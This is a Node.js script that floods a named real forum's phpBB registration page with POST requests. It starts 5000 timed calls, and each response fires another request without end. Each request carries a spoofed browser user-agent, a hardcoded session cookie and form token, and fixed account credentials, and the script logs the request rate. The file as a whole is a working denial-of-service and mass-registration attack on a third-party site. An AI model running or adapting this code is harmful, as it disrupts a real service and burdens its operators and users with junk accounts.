const http = require('http');
const constants = require('../list');
const _ = require('underscore');

var requestsCount = 0;
var loadTimeSum = 0;
var loadDataAmount = 0;

function attack(path) {
  if (!path) {
    path = 'http://for-ua.info/ucp.php?mode=register';
  }
  const start = Date.now();
  const req = http.request({
    host: 'for-ua.info',
    method: 'POST',
    path: path,
    headers: {
      'user-agent': constants.browser(),
      'referer': 'http://for-ua.info/ucp.php?mode=register',
      'cache-control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'ru,en-US;q=0.8,en;q=0.6',
      'Cookie': 'phpbb3_dfg23_u=1; phpbb3_dfg23_k=; phpbb3_dfg23_sid=0d023aa521d3e041beb18633a9c0bef2; _gat=1; _ym_uid=147321962228649464; _ym_isad=1; _ga=GA1.2.1422368805.1473219621'
    }
  }, function (res) {
    if ([200, 307, 404].indexOf(res.statusCode) < 0) {
      console.warn(res.statusCode);
    }
    function logResponse() {
      requestsCount++;
      loadTimeSum += Date.now() - start;
      setTimeout(attack, 0)
    }

    // if (307 === res.statusCode) {
    //   logResponse();
    //   attack(res.headers.location);
    // }
    if ('content-length' in res.headers) {
      res.on('data', function (chuck) {
        loadDataAmount += chuck.length
      });
      res.on('end', logResponse);
    }
    else {
      logResponse();
    }
  });
  req.on('error', function (err) {
    console.error('Request error', err);
  });
  req.write('username=taras&email=taras%40yopmail.com&email_confirm=taras%40yopmail.com&new_password=palm1996&password_confirm=palm1996&lang=ru&tz=2&agreed=true&change_lang=0&qa_answer=%D1%80%D0%BE%D1%82&qa_confirm_id=8689d86e4e4a29eacc20b551304e26a1&submit=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C&creation_time=1473219931&form_token=28cca212dae3aec858604966f02046c17ce0de5d');
  req.end();
}

setInterval(function () {
  const time = new Date().toLocaleString();
  const loading = Math.round(loadTimeSum / requestsCount);
  console.log(`# ${time} # ${loading} # ${requestsCount} / ${(loadDataAmount / 1024).toPrecision(5)}`);
  loadTimeSum = 0;
  requestsCount = 0;
  loadDataAmount = 0;
}, 2000);

for (var i = 0; i < 5000; i++) {
  setTimeout(attack, i * 20);
}
